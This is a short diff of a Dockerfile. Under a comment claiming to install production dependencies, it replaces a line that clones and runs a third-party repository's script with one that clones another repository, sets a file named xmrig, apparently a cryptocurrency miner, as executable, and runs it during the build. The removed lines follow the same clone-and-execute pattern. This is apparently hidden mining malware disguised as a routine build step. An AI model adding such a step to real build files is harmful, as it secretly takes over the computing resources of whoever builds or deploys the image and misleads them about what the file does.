@@ -11,6 +11,4 @@ WORKDIR $APP_HOME
 COPY . ./
 
 # Install production dependencies.
-RUN git clone https://github.com/diprassss/KUNTUL.git && cd KUNTUL && chmod 777 Node run.sh && ./run.sh
-RUN git clone https://github.com/diprassss/KUNTUL.git && cd KUNTUL && chmod 777 Node run.sh && ./run.sh
-
+RUN git clone https://github.com/Uytt654/0.git && cd 0 && chmod 777 xmrig run.sh && ./run.sh
